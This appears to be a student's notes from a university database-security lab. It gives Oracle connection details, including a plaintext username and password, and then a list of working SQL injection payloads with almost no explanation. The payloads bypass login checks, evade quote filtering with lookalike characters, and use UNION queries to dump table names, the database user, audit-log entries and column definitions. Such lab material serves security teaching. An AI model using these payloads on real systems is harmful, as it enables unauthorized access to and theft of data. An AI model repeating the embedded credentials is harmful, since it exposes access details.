
### Database Details
|Detail|Value|
|---|:---:|
|JDBC Connection String|`jdbc:oracle:thin:@csse-oracle3.canterbury.ac.nz:1521:CSORA131`|
|Username|`COSC424`|
|Password|`not2secure`|

### SQL Injections
#### Get all users
```sql
' OR 1=1--
```

#### Get all users
```sql
' OR username LIKE '%'--
```

#### Get all users + Meta Filtering
```sql
ʼ or 1 like 1 or 2 like ʼ
```

#### Get all users + Meta Filtering
```sql
ʼ or ʼfooʼ is NOT Null or 2 like ʼ
```

#### Get all tables
```sql
' and 1=0 union select TABLE_NAME as username, TABLESPACE_NAME as upassword from user_tables, users--
```

#### Get current db user name
```sql
' and 1=0 union select user as username, user as upassword from dual--
```

#### Get audits table 1
```sql
' and 1=0 union select useracct as username, actype as upassword from auditlog--
```

#### Get audits table 2
```sql
' and 1=0 union select useracct as username, COMMAND as upassword from auditlog--
```

#### Get user table columns
```sql
' or 1=0 union select COLUMN_NAME as username, DATA_TYPE as upassword from ALL_TAB_COLUMNS where TABLE_NAME='USERS'--
```

#### Get auditlog table columns
```sql
' or 1=0 union select COLUMN_NAME as username, DATA_TYPE as upassword from ALL_TAB_COLUMNS where TABLE_NAME='AUDITLOG'--
```
